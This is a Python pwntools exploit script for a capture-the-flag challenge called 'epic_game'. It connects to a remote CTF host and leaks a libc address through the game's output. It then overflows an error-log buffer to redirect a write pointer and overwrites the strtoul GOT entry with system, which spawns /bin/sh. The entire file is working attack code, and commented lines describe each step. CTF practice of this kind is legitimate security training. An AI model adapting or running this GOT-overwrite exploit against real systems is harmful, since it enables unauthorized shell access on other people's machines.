from pwn import * 

#target = process('./app.out', env={"LD_PRELOAD":"./libc.so.6"})

#pid = gdb.attach(target, "\nb *log_error+100\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\nc\n set disassembly-flavor intel\ncontinue")

target = remote('epic_game.ichsa.ctf.today', 8007)

libc = ELF('libc.so.6')

#gadgets:
curr = p64(0x004044c8)
write_to_log = p64(0x004044c0)
error_log = p64(0x004040c0)


print(target.recvuntil(b'Your Choice:'))

#It will just pick my player type at random.
#I am already starting to send it information that will fill error_log to reduce my interactions with the server.

target.sendline(b'a' * 0x3e)

print(target.recvuntil(b'Choose your character name (limit to 12 chars)'))

target.sendline(b'a' * 0x3e)

print(target.recvuntil(b'number is '))
result = target.recvuntil(b'You')

leak = result.replace(b'\nYou', b'')
print('leak is', hex(int(leak)))

rand_libc = int(leak)

libc_base = rand_libc - libc.symbols['rand']

system_libc = libc_base + libc.symbols['system']


for i in range(15):
	
	print(target.recvuntil(b'Your Choice:', timeout=1))
	target.sendline(b'a' * 0x3b)

print(target.recvuntil(b'Your Choice:', timeout=1))

padding = b'a' * 6
curr_payload = padding

#\x49 gets puts
#\x51 is strlen
#\xa9 is strtoul
curr_payload += b'\xa9' + b'\xff' * 7 
#This is setting the value in curr, which controls where my next write goes
target.sendline(curr_payload)

#This is setting the GOT entry for strtoul to system
print(target.recvuntil(b'Your Choice:', timeout=1))
target.sendline(p64(system_libc))

#When strtoul is called on our input, we get system(/bin/sh) instead!
print(target.recvuntil(b'Your Choice:', timeout=1))
target.sendline(b'/bin/sh\x00')

target.interactive()

